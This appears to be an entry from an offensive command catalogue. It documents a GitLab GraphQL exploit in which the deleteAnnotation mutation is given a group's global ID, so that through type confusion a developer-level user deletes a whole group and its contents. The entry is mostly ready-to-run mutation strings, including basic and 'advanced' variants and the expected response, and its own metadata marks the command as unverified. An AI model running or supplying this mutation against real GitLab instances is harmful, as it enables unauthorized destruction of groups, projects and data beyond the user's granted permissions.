---
data: >-
  mutation { deleteAnnotation(input: {id: "gid://GitLab/Group/<group-id>"}) {
  clientMutationId } }
tags:
  - graphql
  - exploit
type: command
output: '{"data":{"deleteAnnotation":{"clientMutationId":null}}}'
executor: graphql
platforms:
  - Web
  - GitLab
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.413Z'
id: 3454233f-01b8-4a83-8a27-314b74b6c957
verified: false
validated: true
submitted: true
---
# deleteAnnotation-Group-Mutation

## Command

```graphql
mutation { deleteAnnotation(input: {id: "gid://GitLab/Group/<group-id>"}) { clientMutationId } }
```

## Description

GraphQL mutation to exploit type confusion for group deletion in GitLab, using group GID in place of annotation ID. Executed by developer with group permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| input.id | Global ID of the group (gid://GitLab/Group/<group-id>) | Yes |

## Examples

### Basic Usage

```graphql
mutation { deleteAnnotation(input: {id: "gid://GitLab/Group/456"}) { clientMutationId } }
```

### Advanced Usage

With error handling:

```graphql
mutation { deleteAnnotation(input: {id: "gid://GitLab/Group/456", clientMutationId: "def456"}) { clientMutationId errors } }
```

## Expected Output

Response confirming deletion: {"data":{"deleteAnnotation":{"clientMutationId":null}}}, group and contents deleted.

## Related

- [[commands/deleteAnnotation-Project-Mutation]]
- [[procedures/Exploit-deleteAnnotation-on-Group]]
